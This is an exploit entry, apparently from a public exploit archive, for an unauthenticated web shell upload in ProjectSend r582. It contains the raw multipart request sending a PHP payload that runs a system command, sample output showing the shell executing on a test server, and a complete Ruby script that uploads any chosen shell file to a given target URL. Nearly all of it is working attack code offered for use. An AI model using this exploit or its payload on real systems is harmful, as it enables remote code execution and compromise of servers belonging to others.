# Exploit Title: ProjectSend-r582 WebShell Upload(non-auth)
# Date: 2015-07-01
# Exploit Author: hahwul
# Blog: http://www.codeblack.net
# Vendor Homepage: http://www.projectsend.org
# Software Link: http://www.projectsend.org/download/108/
# Version: ProjectSend-r582
# Tested on: debian [wheezy]
# CVE : none

#gem install multipart-post
=begin
       
Attack Code
POST /vul_test/ProjectSend/process-upload.php HTTP/1.1
Host: 127.0.0.1
....
Cache-Control: no-cache

-----------------------------16756367381868145414300681314
Content-Disposition: form-data; name="name"


shell.php
-----------------------------16756367381868145414300681314
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png


<?echo "WEBSHELL UPLOAD<br>";echo system("ls -all");?>
-----------------------------16756367381868145414300681314--

Result
# ruby ProjectSend_r582_webshell.rb http://127.0.0.1/vul_test/ps shell.php
Target: 127.0.0.1/vul_test/ps/process-upload.php
Exploit...
Status code: 302
Open WebShell Page :: http://127.0.0.1/vul_test/ps/upload/files/shell.php

http://127.0.0.1/vul_test/ProjectSend/upload/files/shell.php
WEBSHELL UPLOAD
total 12 drwxrwxrwx 2 hahwul hahwul 4096 Jul 1 01:21 . drwxrwxrwx 4 hahwul hahwul 4096 Jul 1 01:11 .. -rw-r--r-- 1 www-data www-data 66 Jul 1 01:21 shell.php -rw-r--r-- 1 www-data www-data 66 Jul 1 01:21 shell.php

=end

require "net/http"
require "uri"
require "net/http/post/multipart"

if ARGV.length != 2

puts "ProjectSend r582ver Webshell Upload"
puts "Usage: ruby ProjectSend_r582_webshell.rb [targetURL] [ShellFile]"
puts "  targetURL(ex): http://127.0.0.1/vul_test/ps"
puts "  ShellFile(ex): MyShell.php"
puts "  Example : ~~.rb http://127.0.0.1/vul_test/ps MyShell.php"
puts "  Include Gem : gem install multipart-post" 
puts "  exploit & code by hahwul[www.codeblack.net]" 

else

target_url = ARGV[0]    # http://127.0.0.1/ps/
shell_name = ARGV[1]    # myshell.php
exp_url = target_url + "/process-upload.php"

uri = URI.parse(exp_url)
http = Net::HTTP.new(uri.host, uri.port)

multipartParams = {"file" => UploadIO.new(File.new(shell_name), "application/octet-stream", "shell.php")}
multipartParams = multipartParams.merge({"name"=>"shell.php"})
request = Net::HTTP::Post::Multipart.new(uri.request_uri, multipartParams)
request["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
request["Cache-Control"] = "no-cache"
request["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.7.0"
request["Connection"] = "keep-alive"
request["Accept-Language"] = "ko-kr,ko;q=0.8,en-us;q=0.5,en;q=0.3"
request["Accept-Encoding"] = "gzip, deflate"
request["Pragma"] = "no-cache"
response = http.request(request)

puts "Target: "+uri.host+uri.path
puts "Exploit..."
puts "Status code: "+response.code
puts "Open WebShell Page :: "+target_url+"/upload/files/"+shell_name

end


